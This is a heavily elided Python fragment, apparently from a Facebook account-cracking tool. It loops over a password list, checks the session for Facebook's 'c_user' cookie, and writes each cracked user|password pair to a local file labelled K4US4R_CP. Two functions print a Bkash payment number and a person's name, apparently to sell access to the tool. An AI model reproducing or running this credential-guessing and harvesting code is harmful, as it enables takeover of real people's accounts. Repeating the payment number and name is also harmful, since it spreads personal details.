            ...
            for pw in __chi__:
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    try:
                        ...
                        print('\r%s[K4US4R-CP] %s | %s ' % (M, user, pw))
                        wrt = '%s|%s' % (user,pw)
                        cp.append(wrt)
                        open('K4US4R_CP.txt' , 'a').write('%s\n' % wrt)
                        break
...
def bnsbuy():
    ...
    if to in r:
        ...
        print
        print('\Bkash Account Number 01934031767\n')
        print('\Facebook Account Name ➣ Md Suman Hossain\n')
        print
        print
...
def reg():
    ...
    print
    print('\Bkash Account Number 01934031767\n')
    print('\rAccount Name ➣ Md Suman Hossain\n')
    print
